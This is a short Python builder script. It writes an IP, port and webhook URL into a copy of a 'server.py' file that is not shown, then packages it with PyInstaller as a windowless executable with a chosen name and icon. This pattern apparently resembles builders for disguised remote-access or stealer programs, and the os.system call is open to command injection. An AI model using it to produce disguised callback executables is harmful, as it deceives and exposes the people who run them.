import argparse, shutil, os

def configure_server(ip, port, webhook):
    shutil.copyfile('server.py', 'server_configured.py')

    with open('server_configured.py', 'r') as file:
        content = file.read()
        content = content.replace("host = \"localhost\"", f"host = \"{ip}\"")
        content = content.replace("port = 9999", f"port = {port}")
        content = content.replace("webhook = \"WEBHOOK_URL\"", f"webhook = \"{webhook}\"")

    with open('server_configured.py', 'w') as file:
        file.write(content)

def build_executable(app_name, icon_path):
    os.system(f"pyinstaller -F -w --name {app_name} --icon {icon_path} server_configured.py")

def main():
    parser = argparse.ArgumentParser(description='Server IP, Port, and Application Name Configuration')
    parser.add_argument('--ip', type=str, help='Server IP address')
    parser.add_argument('--port', type=int, help='Server port number')
    parser.add_argument('--name', type=str, help='Name for the generated executable')
    parser.add_argument('--icon', type=str, help='Path to the icon file')
    parser.add_argument('--webhook', type=str, help='Your server webhook url')
    args = parser.parse_args()

    configure_server(args.ip, args.port, args.webhook)
    build_executable(args.name, args.icon)

main()
